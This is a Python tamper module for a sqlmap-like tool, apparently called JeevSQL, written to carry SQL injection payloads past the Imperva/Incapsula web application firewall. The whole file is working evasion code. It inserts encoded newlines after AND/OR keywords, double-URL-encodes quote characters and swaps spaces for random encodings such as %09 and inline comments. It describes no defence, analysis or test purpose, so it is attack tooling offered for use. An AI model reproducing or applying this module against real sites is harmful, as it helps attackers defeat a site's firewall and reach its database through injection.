#!/usr/bin/env python
# JeevSQL Tamper: impervabypass - by Jeevraj
# Imperva/Incapsula WAF-specific bypass techniques.
from lib.core.enums import PRIORITY
import re, random, urllib.parse

__priority__ = PRIORITY.HIGH

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    result = payload
    # Imperva specific: use %0a between keywords
    result = re.sub(r'\bAND\b', 'AND%0a', result, flags=re.IGNORECASE)
    result = re.sub(r'\bOR\b', 'OR%0a', result, flags=re.IGNORECASE)
    # Double URL encode specific chars that Imperva decodes once then misses
    result = result.replace("'", "%2527")
    result = result.replace('"', "%2522")
    result = result.replace(' ', random.choice(['%2b', '%09', '%0a', '/**/', '+']))
    return result
